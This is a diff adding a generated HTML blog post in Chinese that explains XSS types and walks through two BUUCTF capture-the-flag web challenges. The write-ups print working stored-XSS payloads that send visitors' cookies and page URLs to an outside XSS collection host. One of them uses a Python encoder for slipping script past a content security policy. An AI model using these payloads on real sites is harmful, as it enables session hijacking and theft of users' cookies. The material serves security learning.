@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="xss 1.什么是xss 跨站脚本（XSS, Cross Site Script）攻击指的是，攻击者可以让某网站执行一段非法脚本。这种情况很常见，比如提交一个表单用于修改用户名，我们可以在文本框中输入一些特殊字符，比如 &amp;lt;, &amp;gt;, ‘, ” 等，检查一下用户名是否正确修改了。 xss的三种类型反射型xss 应用程序或API包括未经验证和未经转义的用户输入 作为HTML输出的一部分  存">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://yoursite.com/2019/12/02/xss/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="xss 1.什么是xss 跨站脚本（XSS, Cross Site Script）攻击指的是，攻击者可以让某网站执行一段非法脚本。这种情况很常见，比如提交一个表单用于修改用户名，我们可以在文本框中输入一些特殊字符，比如 &amp;lt;, &amp;gt;, ‘, ” 等，检查一下用户名是否正确修改了。 xss的三种类型反射型xss 应用程序或API包括未经验证和未经转义的用户输入 作为HTML输出的一部分  存">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191202194217583.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191202194601319.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191202194719634.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70">
+<meta property="og:updated_time" content="2019-12-02T12:44:57.842Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Hexo">
+<meta name="twitter:description" content="xss 1.什么是xss 跨站脚本（XSS, Cross Site Script）攻击指的是，攻击者可以让某网站执行一段非法脚本。这种情况很常见，比如提交一个表单用于修改用户名，我们可以在文本框中输入一些特殊字符，比如 &amp;lt;, &amp;gt;, ‘, ” 等，检查一下用户名是否正确修改了。 xss的三种类型反射型xss 应用程序或API包括未经验证和未经转义的用户输入 作为HTML输出的一部分  存">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20191202194217583.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-xss" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/12/02/xss/" class="article-date">
+  <time datetime="2019-12-02T14:16:00.117Z" itemprop="datePublished">2019-12-02</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h1><hr>
+<p><strong>1.什么是xss</strong></p>
+<p>跨站脚本（XSS, Cross Site Script）攻击指的是，攻击者可以让某网站执行一段非法脚本。这种情况很常见，比如提交一个表单用于修改用户名，我们可以在文本框中输入一些特殊字符，比如 &lt;, &gt;, ‘, ” 等，检查一下用户名是否正确修改了。</p>
+<p>xss的三种类型<br>反射型xss 应用程序或API包括未经验证和未经转义的用户输入 作为HTML输出的一部分 </p>
+<p>存储型xss 存储在服务器中加入代码，如果没有过滤或过滤不严，那么这些代码将储存到，<br>服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS非常危险，是永久型的。判断是否存在存储型xss时，首先要确定输入点和输入点。查看源码，如果输入的内容在HTML标签内，输入的内容无法被当成JavaScript代码运行。因为浏览器解析时，会把数据以文本形式输出在网页中，此时就需要构造语句 <code>/script&gt;alert(1)&lt;/script&gt;</code>来去闭合HTML标签。</p>
+<p>DOM型XSS：基于文档对象模型Document Objeet Model，DOM)的一种漏洞。DOM是<br>一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和<br>样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，<br>如uRI ，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它<br>不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有<br>经过严格确认，就会产生DOM XSS漏洞。</p>
+<hr>
+<p><strong>检测xss</strong></p>
+<p>检测xss一般有两种方式，一种是手工检测，另一种是软件检测。这里直接介绍手工检测。输入一些敏感字符，例如’&lt;’,’&gt;’,’()’。提交请求后查看HTML源代码，看这些字符是否被转义。如果输出字符，说明程序很有可能做了过滤。这是在知道输出位置的情况下，另一种””/&gt;***”。手工检测目的就是为了看web应用是否有漏洞。最多的是考虑哪里有输入，数据该在什么地方输出。</p>
+<hr>
+<p><strong>2.BUU XSS COURSE1</strong></p>
+<p>题目链接：<a href="https://buuoj.cn/challenges#BUU%20XSS%20COURSE%201" target="_blank" rel="noopener">https://buuoj.cn/challenges#BUU%20XSS%20COURSE%201</a></p>
+<p>打开发现让我们输入内容提交，类似于论坛的发表评论。很容易就能想到这是存储型xss,攻击者提交恶意代码到服务器中，当其他用户访问页面时就会触发这些恶意代码。从而造成cookie泄露。</p>
+<p><img src="https://img-blog.csdnimg.cn/20191202194217583.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
+<p>先试试直接提交<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>,发现没法弹窗，说明网站有限制,可能过滤了script那么试试img标签事件报错<code>&lt;img src=&#39;abc&#39; onerror=&#39;alert(1)&#39;/&gt;</code> 可以弹窗，说明这里有xss点。</p>
+<p>接着上传js恶意代码。</p>
+<pre><code>&lt;img src=&apos;/aaaww&apos; onerror=&quot;(function(){(new
+Image()).src=&apos;http://xss.buuoj.cn/index.php?
+do=api&amp;id=PkXQxo&amp;location=&apos;+escape((function()
+{try{return document.location.href}catch(e){return &apos;&apos;}})())
++&apos;&amp;toplocation=&apos;+escape((function(){try{return
+top.location.href}catch(e){return &apos;&apos;}})())
++&apos;&amp;cookie=&apos;+escape((function(){try{return
+document.cookie}catch(e){return &apos;&apos;}})())
++&apos;&amp;opener=&apos;+escape((function(){try{return (window.opener
+&amp;&amp; window.opener.location.href)?
+window.opener.location.href:&apos;&apos;}catch(e){return &apos;&apos;}})());})();&quot;/&gt;</code></pre><p><img src="https://img-blog.csdnimg.cn/20191202194601319.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
+<p>注意这里的id应该是你在xss平台创建的项目代码的id。打开xss平台，收到上传的信息。发现里面有cookie phpSESSIONID这就是网站管理员的cookie。还能看到http referer（信息来源的地址）我们用这个管理员的cookie去访问referer里的网址，利用Firefox的插件editcookie更改网站的cookie就能得到flag。改变flag我们可以用hackbar。</p>
+<p><img src="https://img-blog.csdnimg.cn/20191202194719634.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
+<hr>
+<p><strong>3.CISCN web2</strong></p>
+<p>题目链接  <a href="https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA]Web2" target="_blank" rel="noopener">https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA]Web2</a></p>
+<p>writeup链接：<a href="https://www.zhaoj.in/read-6100.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-6100.html</a></p>
+<p>看到投稿界面，很容易想到通过利用xss漏洞来把恶意脚本上传，这是典型的存储型xss。</p>
+<p>试试在投稿界面写入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>。打开保存信息的页面，发现啥都没有。那我们可以看看这个保存页面的源代码，发现<br><code>&lt;meta http-equiv=&quot;content-security-policy&quot; content=&quot;default-src &#39;self&#39;; script-src &#39;unsafe-inline&#39; &#39;unsafe-eval&#39;&quot;&gt;</code></p>
+<p>在网上搜索了一下，content-security-policy指的是内容安全策略。其核心思想十分简单：网站通过发送一个 CSP 头部，来告诉浏览器什么是被授权执行的与什么是需要被禁止的。其被誉为专门为解决XSS攻击而生的神器。</p>
+<p>回过来看，可以明白javascript脚本被禁了，所以我们没法直接上传javascript代码。具体研究一下发现被转码了。怎么能绕过？这里要用到HTML markup。把我们要上传的javascript代码转成markup,可以用python脚本来转成markup。</p>
+<pre><code>in_str = &quot;(function(){window.location.href=&apos;http://xss.buuoj.cn/index.php?do=api&amp;id=xpqwIP&amp;keepsession=0&amp;location=&apos;+escape((function(){try{return document.location.href}catch(e){return&apos;&apos;}})())+&apos;&amp;toplocation=&apos;+escape((function(){try{return top.location.href}catch(e){return&apos;&apos;}})())+&apos;&amp;cookie=&apos;+escape((function(){try{return document.cookie}catch(e){return&apos;&apos;}})())+&apos;&amp;opener=&apos;+escape((function(){try{return(window.opener&amp;&amp;window.opener.location.href)?window.opener.location.href:&apos;&apos;}catch(e){return&apos;&apos;}})());})();&quot;
+
+output = &quot;&quot;
+
+for c in in_str:
+output += &quot;&amp;#&quot; + str(ord(c))
+
+print(&quot;&lt;svg&gt;&lt;script&gt;eval&amp;#40&amp;#34&quot; + output + &quot;&amp;#34&amp;#41&lt;/script&gt;&quot;)</code></pre><p>提交一下,同样利用xss平台获取cooike。访问时发现了页面让我们输入id名称，输入一下，发现报错，说明了这里可能是sql联合注入。利用sqlmap跑一下。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/12/02/xss/" data-id="ck3oj0ogo0001lsv9jtucunl9" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2019/10/22/新文档/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2019/12/02/xss/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/22/新文档/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2019/06/04/hello-world/">Hello World</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2019 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
